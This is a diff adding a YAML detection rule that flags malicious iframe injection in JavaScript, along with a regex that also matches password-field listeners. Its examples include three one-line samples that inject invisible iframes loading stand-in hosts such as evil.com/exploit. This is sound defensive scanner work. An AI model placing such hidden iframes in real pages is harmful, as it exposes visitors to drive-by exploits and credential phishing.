@@ -1,0 +1,35 @@
+# JavaScript Pattern: Malicious iframe Injection
+# Detects dynamic iframe creation for malicious purposes
+
+id: JS-011
+name: Malicious iframe Injection
+description: |
+  Detects dynamic creation of iframes which can be used for clickjacking, phishing,
+  or loading malicious content. Attackers inject hidden or deceptive iframes to
+  steal credentials, perform actions on behalf of users, or load exploit kits.
+  This pattern identifies suspicious iframe creation patterns.
+languages:
+  - javascript
+detection_type: regex
+detection_logic: '(?:createElement\s*\(\s*["\x27]iframe|\.innerHTML.*<iframe|document\.write.*<iframe)|(?:querySelectorAll.*password|input.*type.*password).*addEventListener.*(?:change|input|blur)'
+severity: High
+mitre_technique: T1189
+confidence: 0.85
+category: initial_access
+enabled: true
+metadata:
+  author: Script Sentinel Team
+  created: "2025-11-17"
+  updated: "2025-11-17"
+  references:
+    - "https://attack.mitre.org/techniques/T1189/"
+    - "https://owasp.org/www-community/attacks/Clickjacking"
+  tags:
+    - javascript
+    - iframe
+    - clickjacking
+    - phishing
+  examples:
+    - "var iframe = document.createElement('iframe'); iframe.style.display = 'none'; iframe.src = 'http://evil.com/exploit';"
+    - "document.body.innerHTML += '<iframe src=\"http://phishing.com\" style=\"width:0;height:0;border:0\"></iframe>';"
+    - "document.write('<iframe src=\"http://malware.com\" style=\"opacity:0\"></iframe>');"
